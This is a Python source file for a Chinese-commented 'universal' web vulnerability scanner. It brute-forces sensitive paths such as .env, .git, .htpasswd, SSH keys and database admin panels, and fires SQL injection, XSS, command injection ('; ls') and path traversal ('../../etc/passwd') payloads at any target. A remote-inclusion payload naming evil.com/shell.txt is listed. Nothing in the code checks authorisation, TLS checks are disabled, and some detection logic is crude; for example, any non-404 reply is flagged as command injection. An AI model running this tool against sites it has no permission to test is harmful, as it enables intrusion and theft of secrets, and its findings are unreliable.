#!/usr/bin/env python3
"""
🔍 通用安全扫描器 - 支持任意网站
"""

import requests
import re
import time
import json
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urljoin, urlparse
from typing import Dict, List, Optional
import logging

logger = logging.getLogger(__name__)


class UniversalScanner:
    """通用安全扫描器"""

    def __init__(self, config: Dict):
        self.config = config.get('scan', {})
        self.threads = self.config.get('threads', 15)
        self.timeout = self.config.get('timeout', 15)
        self.depth = self.config.get('depth', 'aggressive')

        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8'
        })

        # 加载通用字典
        self.wordlists = self.load_universal_wordlists()

        print(f"🔍 通用扫描器初始化 (线程: {self.threads}, 模式: {self.depth})")

    def load_universal_wordlists(self) -> Dict[str, List[str]]:
        """加载通用字典"""
        wordlists = {
            'common_paths': [
                # 管理员页面
                '/admin', '/administrator', '/admin.php', '/admin.asp', '/admin.jsp',
                '/admin/', '/administrator/', '/admin123/', '/admin888/',
                '/admincp', '/admincp/', '/admincenter', '/admincenter/',
                '/admin_login', '/admin-login', '/adminlogin',
                '/admin_area', '/admin-area', '/adminarea',
                '/panel', '/panel/', '/controlpanel', '/cp', '/cpanel',
                '/manage', '/manager', '/management', '/system',
                '/console', '/dashboard', '/backoffice',

                # 登录页面
                '/login', '/login.php', '/login.asp', '/login.jsp',
                '/signin', '/signin.php', '/signin.jsp',
                '/auth', '/authentication', '/authenticate',
                '/user', '/user/', '/user/login', '/user/signin',
                '/account', '/account/login', '/account/signin',
                '/member', '/member/login', '/members',
                '/secure', '/secure/login', '/security',

                # API接口
                '/api', '/api/', '/api/v1', '/api/v2', '/api/v3',
                '/rest', '/rest/', '/rest/api', '/rest/v1',
                '/graphql', '/graphql/', '/gql', '/gql/',
                '/soap', '/soap/', '/xmlrpc', '/xmlrpc.php',
                '/json', '/json/', '/json/api', '/jsonrpc',
                '/swagger', '/swagger-ui', '/swagger-ui.html',
                '/openapi', '/openapi.json', '/api-docs', '/docs',
                '/redoc', '/redoc/', '/rapidoc',

                # 配置文件
                '/.env', '/env', '/.env.local', '/.env.production',
                '/config', '/config/', '/config.php', '/config.inc.php',
                '/configuration', '/configuration.php',
                '/settings', '/settings.php', '/settings.py',
                '/application.ini', '/application.properties',
                '/web.config', '/web.xml', '/server.xml',

                # 信息泄露
                '/phpinfo.php', '/phpinfo', '/info.php', '/info',
                '/test.php', '/test', '/debug.php', '/debug',
                '/status', '/status.php', '/server-status',
                '/.git/', '/.git/HEAD', '/.git/config',
                '/.svn/', '/.svn/entries',
                '/.DS_Store', '/.DS_Store/',
                '/.htaccess', '/.htpasswd',
                '/robots.txt', '/sitemap.xml', '/crossdomain.xml',
                '/security.txt', '/.well-known/security.txt',

                # 数据库管理
                '/phpmyadmin', '/phpMyAdmin', '/pma', '/myadmin',
                '/adminer', '/adminer.php', '/adminer-4.7.0.php',
                '/mysql', '/mysql/', '/mysql/admin',
                '/db', '/db/', '/database', '/database/',
                '/dba', '/dba/', '/dbadmin', '/dbadmin/',

                # 备份文件
                '/backup', '/backup/', '/backups', '/backups/',
                '/bak', '/bak/', '/back', '/back/',
                '/old', '/old/', '/temp', '/temp/',
                '/tmp', '/tmp/', '/cache', '/cache/',

                # 上传目录
                '/uploads', '/uploads/', '/upload', '/upload/',
                '/files', '/files/', '/images', '/images/',
                '/assets', '/assets/', '/static', '/static/',
                '/media', '/media/', '/download', '/download/',

                # 其他敏感
                '/.bash_history', '/.bashrc', '/.profile',
                '/ssh', '/ssh/', '/ssh_keys', '/ssh-keys',
                '/secret', '/secret/', '/secrets', '/secrets/',
                '/private', '/private/', '/hidden', '/hidden/',
                '/internal', '/internal/', '/secure_files',
            ],

            'cms_specific': {
                'wordpress': [
                    '/wp-admin', '/wp-login.php', '/wp-content',
                    '/wp-includes', '/wp-config.php', '/wp-json',
                    '/xmlrpc.php', '/wp-signup.php', '/wp-trackback.php'
                ],
                'joomla': [
                    '/administrator', '/administrator/index.php',
                    '/components', '/modules', '/templates',
                    '/libraries', '/plugins', '/media'
                ],
                'drupal': [
                    '/user/login', '/user/register', '/user/password',
                    '/admin', '/admin/config', '/admin/modules',
                    '/sites/all', '/modules', '/themes'
                ],
                'laravel': [
                    '/.env', '/storage', '/bootstrap/cache',
                    '/vendor', '/public/index.php', '/routes'
                ],
                'django': [
                    '/admin', '/admin/login', '/static/admin',
                    '/media', '/accounts/login', '/api'
                ]
            },

            'vulnerability_patterns': [
                # SQL注入测试点
                '?id=1', '?page=1', '?user=1', '?product=1',
                '?category=1', '?news=1', '?article=1',
                '?search=', '?q=', '?query=', '?s=',

                # 文件包含
                '?page=index', '?file=index', '?template=index',
                '?include=index', '?module=index',

                # XSS测试点
                '?name=', '?title=', '?comment=', '?message=',
                '?feedback=', '?review=', '?content=',

                # 命令注入
                '?cmd=', '?command=', '?exec=', '?system=',
                '?ping=', '?host=', '?ip=',

                # 路径遍历
                '?file=../../', '?path=../../', '?folder=../../',
                '?directory=../../', '?doc=../../',
            ]
        }

        # 根据深度调整字典大小
        if self.depth == 'aggressive':
            # 添加更多路径
            additional_paths = [
                                   f'/admin{i}' for i in range(1, 10)
                               ] + [
                                   f'/login{i}' for i in range(1, 10)
                               ] + [
                                   f'/api{v}' for v in ['', 'v1', 'v2', 'v3', 'v4', 'latest']
                               ]
            wordlists['common_paths'].extend(additional_paths)

        return wordlists

    def comprehensive_scan(self, target: str, recon_info: Dict) -> Dict:
        """全面安全扫描"""
        print(f"  开始全面扫描: {target}")

        results = {
            'target': target,
            'scan_time': time.strftime('%Y-%m-%d %H:%M:%S'),
            'vulnerabilities': [],
            'sensitive_paths': [],
            'security_issues': [],
            'authentication_points': []
        }

        # 1. 目录爆破
        print("    进行目录爆破...")
        directory_results = self.directory_bruteforce(target, recon_info)
        results['sensitive_paths'] = directory_results

        # 2. 漏洞扫描
        print("    扫描常见漏洞...")
        vuln_results = self.vulnerability_scan(target)
        results['vulnerabilities'] = vuln_results

        # 3. 安全检查
        print("    执行安全检查...")
        security_results = self.security_checks(target)
        results['security_issues'] = security_results

        # 4. 识别认证点
        print("    识别认证入口...")
        auth_points = self.identify_auth_points(target, directory_results)
        results['authentication_points'] = auth_points

        print(f"    扫描完成！发现 {len(vuln_results)} 漏洞, {len(directory_results)} 敏感路径")

        return results

    def directory_bruteforce(self, target: str, recon_info: Dict) -> List[Dict]:
        """目录爆破"""
        found_paths = []

        # 选择字典
        paths_to_test = self.wordlists['common_paths'].copy()

        # 根据技术栈添加特定路径
        tech_stack = recon_info.get('tech_stack', [])
        cms_type = recon_info.get('cms')

        if cms_type and cms_type in self.wordlists['cms_specific']:
            paths_to_test.extend(self.wordlists['cms_specific'][cms_type])

        # 限制测试数量
        if self.depth == 'quick':
            paths_to_test = paths_to_test[:50]
        elif self.depth == 'normal':
            paths_to_test = paths_to_test[:100]
        # aggressive模式使用全部

        print(f"    测试 {len(paths_to_test)} 个路径...")

        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            future_to_path = {}

            for path in paths_to_test:
                url = urljoin(target, path)
                future = executor.submit(self.check_url, url)
                future_to_path[future] = (url, path)

            completed = 0
            for future in as_completed(future_to_path):
                completed += 1

                # 显示进度
                if completed % 20 == 0:
                    print(f"    进度: {completed}/{len(paths_to_test)}", end='\r')

                try:
                    result = future.result(timeout=self.timeout)
                    if result and self.is_interesting_result(result):
                        url, path = future_to_path[future]
                        found_paths.append(result)

                        # 实时显示发现
                        if result['status'] != 404:
                            self.print_discovery(result)

                except:
                    pass

            print(f"    进度: {completed}/{len(paths_to_test)} 完成")

        return found_paths

    def check_url(self, url: str) -> Optional[Dict]:
        """检查URL"""
        try:
            response = self.session.get(
                url,
                timeout=self.timeout,
                verify=False,
                allow_redirects=True
            )

            # 提取信息
            page_type = self.classify_page(response.text, url)
            title = self.extract_title(response.text)

            return {
                'url': response.url,
                'original_url': url,
                'status': response.status_code,
                'type': page_type,
                'title': title,
                'content_length': len(response.content),
                'response_time': response.elapsed.total_seconds(),
                'headers': dict(response.headers)
            }

        except Exception as e:
            return {
                'url': url,
                'status': 'error',
                'type': 'error',
                'title': str(e)[:50],
                'content_length': 0,
                'response_time': 0
            }

    def classify_page(self, content: str, url: str) -> str:
        """分类页面类型"""
        content_lower = content.lower()
        url_lower = url.lower()

        # 登录页面
        if any(keyword in content_lower for keyword in ['login', 'sign in', 'password', '用户名', '密码']):
            return 'login_page'

        # 管理后台
        if any(keyword in content_lower for keyword in ['admin', 'dashboard', '控制台', '管理后台']):
            return 'admin_panel'

        # API接口
        if any(keyword in content_lower or keyword in url_lower
               for keyword in ['api', 'json', 'xml', 'rest', 'graphql', 'swagger']):
            return 'api_endpoint'

        # 错误页面
        if any(keyword in content_lower for keyword in ['404', 'not found', 'error', '无法找到']):
            return 'error_page'

        # 配置文件
        if any(keyword in content_lower for keyword in ['config', 'database', 'password', 'secret']):
            return 'config_file'

        # 文件列表
        if any(keyword in content_lower for keyword in ['index of', 'directory listing', '文件列表']):
            return 'directory_listing'

        return 'normal_page'

    def extract_title(self, html: str) -> str:
        """提取标题"""
        match = re.search(r'<title>(.*?)</title>', html, re.IGNORECASE)
        return match.group(1).strip()[:100] if match else ''

    def is_interesting_result(self, result: Dict) -> bool:
        """判断是否是有趣的结果"""
        status = result['status']

        # 跳过404和错误
        if status in [404, 'error']:
            return False

        # 跳过太小的页面（可能只是跳转）
        if result['content_length'] < 100:
            return False

        return True

    def print_discovery(self, result: Dict):
        """打印发现"""
        status = result['status']
        url = result['url']
        page_type = result['type']

        icons = {
            'login_page': '🔐',
            'admin_panel': '⚡',
            'api_endpoint': '🔗',
            'config_file': '⚙️',
            'directory_listing': '📁',
            'error_page': '❌',
            'normal_page': '📄'
        }

        icon = icons.get(page_type, '📄')

        if status == 200:
            status_str = f"✅[{status}]"
        elif status in [301, 302]:
            status_str = f"🔄[{status}]"
        elif status == 403:
            status_str = f"🚫[{status}]"
        elif status == 500:
            status_str = f"💥[{status}]"
        else:
            status_str = f"[{status}]"

        print(f"    {icon} {status_str} {url}")

    def vulnerability_scan(self, target: str) -> List[Dict]:
        """漏洞扫描"""
        vulnerabilities = []

        # SQL注入测试
        sql_vulns = self.test_sql_injection(target)
        vulnerabilities.extend(sql_vulns)

        # XSS测试
        xss_vulns = self.test_xss(target)
        vulnerabilities.extend(xss_vulns)

        # 命令注入测试
        cmd_vulns = self.test_command_injection(target)
        vulnerabilities.extend(cmd_vulns)

        # 文件包含测试
        fi_vulns = self.test_file_inclusion(target)
        vulnerabilities.extend(fi_vulns)

        # 路径遍历测试
        pt_vulns = self.test_path_traversal(target)
        vulnerabilities.extend(pt_vulns)

        return vulnerabilities

    def test_sql_injection(self, target: str) -> List[Dict]:
        """SQL注入测试"""
        payloads = [
            ("'", "单引号"),
            ("\"", "双引号"),
            ("' OR '1'='1", "永真条件"),
            ("' OR 1=1--", "注释绕过"),
            ("' UNION SELECT NULL--", "联合查询"),
            ("' AND SLEEP(5)--", "时间盲注"),
            ("1' AND '1'='1", "逻辑测试"),
            ("1' AND '1'='2", "逻辑测试")
        ]

        vulns = []

        # 测试常见参数
        test_params = ['id', 'page', 'user', 'product', 'category', 'news', 'article']

        for param in test_params[:3]:  # 测试前3个参数
            for payload, description in payloads[:4]:  # 测试前4个payload
                test_url = f"{target}?{param}={payload}"

                try:
                    response = self.session.get(test_url, timeout=5, verify=False)
                    content = response.text.lower()

                    # 检测错误信息
                    error_indicators = [
                        'sql', 'mysql', 'syntax', 'error', 'exception',
                        '警告', '错误', '语法', '数据库', 'query'
                    ]

                    if any(indicator in content for indicator in error_indicators):
                        vulns.append({
                            'type': 'sql_injection',
                            'severity': 'high',
                            'url': test_url,
                            'payload': payload,
                            'description': f"SQL注入可能 - {description}",
                            'evidence': '发现数据库错误信息'
                        })
                        break  # 发现一个就停止测试这个参数

                except:
                    continue

        return vulns

    def test_xss(self, target: str) -> List[Dict]:
        """XSS测试"""
        payloads = [
            ("<script>alert('XSS')</script>", "基础XSS"),
            ("<img src=x onerror=alert(1)>", "图片XSS"),
            ("\" onmouseover=\"alert(1)", "事件处理器XSS"),
            ("<svg onload=alert(1)>", "SVG XSS"),
            ("javascript:alert(1)", "JavaScript协议")
        ]

        vulns = []
        test_params = ['q', 'search', 'name', 'comment', 'message']

        for param in test_params[:3]:
            for payload, description in payloads[:3]:
                test_url = f"{target}?{param}={payload}"

                try:
                    response = self.session.get(test_url, timeout=5, verify=False)

                    # 检查payload是否被反射
                    if payload in response.text:
                        vulns.append({
                            'type': 'xss',
                            'severity': 'medium',
                            'url': test_url,
                            'payload': payload,
                            'description': f"反射型XSS可能 - {description}",
                            'evidence': '输入被反射到响应中'
                        })
                        break

                except:
                    continue

        return vulns

    def test_command_injection(self, target: str) -> List[Dict]:
        """命令注入测试"""
        payloads = [
            (";ls", "分号执行"),
            ("| ls", "管道执行"),
            ("&& ls", "与执行"),
            ("|| ls", "或执行"),
            ("`ls`", "反引号执行")
        ]

        vulns = []
        test_params = ['cmd', 'command', 'exec', 'ping', 'host']

        for param in test_params:
            for payload, description in payloads:
                test_url = f"{target}?{param}={payload}"

                try:
                    # 这里主要测试参数是否存在
                    response = self.session.get(test_url, timeout=5, verify=False)

                    # 简单检测：如果页面返回不同，可能存在问题
                    if response.status_code != 404:
                        vulns.append({
                            'type': 'command_injection',
                            'severity': 'high',
                            'url': test_url,
                            'payload': payload,
                            'description': f"命令注入可能 - {description}",
                            'evidence': '参数可能被执行'
                        })

                except:
                    continue

        return vulns

    def test_file_inclusion(self, target: str) -> List[Dict]:
        """文件包含测试"""
        payloads = [
            ("../../../../etc/passwd", "读取passwd文件"),
            ("../../../../windows/win.ini", "读取Windows配置文件"),
            ("php://filter/convert.base64-encode/resource=index.php", "PHP过滤器"),
            ("http://evil.com/shell.txt", "远程文件包含")
        ]

        vulns = []
        test_params = ['file', 'page', 'template', 'include']

        for param in test_params:
            for payload, description in payloads[:2]:  # 只测试本地文件包含
                test_url = f"{target}?{param}={payload}"

                try:
                    response = self.session.get(test_url, timeout=5, verify=False)
                    content = response.text

                    # 检测常见文件内容
                    if 'root:' in content or '[extensions]' in content:
                        vulns.append({
                            'type': 'file_inclusion',
                            'severity': 'high',
                            'url': test_url,
                            'payload': payload,
                            'description': f"文件包含漏洞 - {description}",
                            'evidence': '成功读取系统文件'
                        })
                        break

                except:
                    continue

        return vulns

    def test_path_traversal(self, target: str) -> List[Dict]:
        """路径遍历测试"""
        payloads = [
            ("../../../etc/passwd", "Linux路径遍历"),
            ("..\\..\\..\\windows\\win.ini", "Windows路径遍历"),
            ("....//....//....//etc/passwd", "双重编码绕过")
        ]

        vulns = []
        test_params = ['file', 'path', 'folder', 'directory']

        for param in test_params:
            for payload, description in payloads:
                test_url = f"{target}?{param}={payload}"

                try:
                    response = self.session.get(test_url, timeout=5, verify=False)
                    content = response.text

                    if 'root:' in content or '[fonts]' in content:
                        vulns.append({
                            'type': 'path_traversal',
                            'severity': 'high',
                            'url': test_url,
                            'payload': payload,
                            'description': f"路径遍历漏洞 - {description}",
                            'evidence': '成功读取系统文件'
                        })
                        break

                except:
                    continue

        return vulns

    def security_checks(self, target: str) -> List[Dict]:
        """安全检查"""
        issues = []

        # 1. 检查安全头
        try:
            response = self.session.get(target, timeout=5, verify=False)
            headers = response.headers

            security_headers = {
                'X-Frame-Options': '防止点击劫持',
                'X-Content-Type-Options': '防止MIME类型混淆',
                'X-XSS-Protection': 'XSS保护',
                'Content-Security-Policy': '内容安全策略',
                'Strict-Transport-Security': '强制HTTPS',
                'Referrer-Policy': '控制Referer信息'
            }

            missing = []
            for header, description in security_headers.items():
                if header not in headers:
                    missing.append(header)

            if missing:
                issues.append({
                    'type': 'missing_security_headers',
                    'severity': 'medium',
                    'description': f"缺少安全头: {', '.join(missing)}",
                    'recommendation': '配置适当的安全HTTP头'
                })

        except:
            pass

        # 2. 检查HTTP方法
        try:
            response = self.session.request('OPTIONS', target, timeout=5, verify=False)
            if 'allow' in response.headers:
                methods = response.headers['allow']
                if 'PUT' in methods or 'DELETE' in methods:
                    issues.append({
                        'type': 'dangerous_http_methods',
                        'severity': 'medium',
                        'description': f"启用的危险HTTP方法: {methods}",
                        'recommendation': '禁用不必要的HTTP方法'
                    })
        except:
            pass

        # 3. 检查信息泄露
        try:
            response = self.session.get(target, timeout=5, verify=False)
            content = response.text.lower()

            sensitive_keywords = [
                ('password', '密码明文'),
                ('secret', '密钥信息'),
                ('api_key', 'API密钥'),
                ('database', '数据库信息'),
                ('config', '配置信息'),
                ('debug', '调试信息'),
                ('test', '测试信息')
            ]

            found = []
            for keyword, description in sensitive_keywords:
                if keyword in content:
                    found.append(description)

            if found:
                issues.append({
                    'type': 'information_disclosure',
                    'severity': 'low',
                    'description': f"可能的信息泄露: {', '.join(found[:3])}",
                    'recommendation': '移除敏感信息'
                })

        except:
            pass

        return issues

    def identify_auth_points(self, target: str, found_paths: List[Dict]) -> List[Dict]:
        """识别认证入口点"""
        auth_points = []

        for path_info in found_paths:
            if path_info['type'] in ['login_page', 'admin_panel']:
                auth_points.append({
                    'url': path_info['url'],
                    'type': path_info['type'],
                    'status': path_info['status']
                })

        # 如果没有找到，检查常见登录路径
        if not auth_points:
            common_auth_paths = [
                '/login', '/signin', '/auth', '/admin', '/wp-login.php'
            ]

            for path in common_auth_paths:
                url = urljoin(target, path)
                try:
                    response = self.session.get(url, timeout=5, verify=False)
                    if response.status_code in [200, 301, 302]:
                        auth_points.append({
                            'url': url,
                            'type': 'potential_auth',
                            'status': response.status_code
                        })
                except:
                    pass

        return auth_points


# 测试函数
def test_scanner():
    """测试扫描器"""
    print("=" * 60)
    print("🧪 通用扫描器测试")
    print("=" * 60)

    config = {
        'scan': {
            'threads': 5,
            'timeout': 10,
            'depth': 'normal'
        }
    }

    scanner = UniversalScanner(config)

    # 测试扫描功能
    test_target = "http://example.com"
    recon_info = {'tech_stack': ['PHP'], 'cms': None}

    print(f"测试目标: {test_target}")
    results = scanner.comprehensive_scan(test_target, recon_info)

    print(f"\n扫描结果:")
    print(f"  发现漏洞: {len(results['vulnerabilities'])} 个")
    print(f"  敏感路径: {len(results['sensitive_paths'])} 个")
    print(f"  安全问题: {len(results['security_issues'])} 个")
    print(f"  认证入口: {len(results['authentication_points'])} 个")

    print("\n" + "=" * 60)


if __name__ == "__main__":
    test_scanner()